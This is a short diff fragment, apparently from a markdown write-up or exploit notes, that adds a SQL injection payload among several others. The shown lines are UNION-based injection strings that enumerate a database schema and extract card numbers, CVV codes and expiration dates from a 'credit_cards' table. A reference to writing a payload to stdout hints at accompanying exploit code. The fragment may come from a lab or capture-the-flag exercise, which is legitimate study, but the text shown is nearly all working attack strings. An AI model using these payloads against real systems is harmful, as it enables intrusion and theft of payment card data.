@@ -51,6 +51,9 @@ sys.stdout.buffer.write(payload)
 ' union select null, table_name, column_name,null,null,null,null from INFORMATION_SCHEMA.COLUMNS where table_name = 'credit_cards' -- 
 ```
 ```commandline
+' union select null, ccnumber, ccv, expiration,null,null,null from credit_cards -- 
+```
+```commandline
 ' union select null, ccv, expiration,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
 ```
 ```commandline
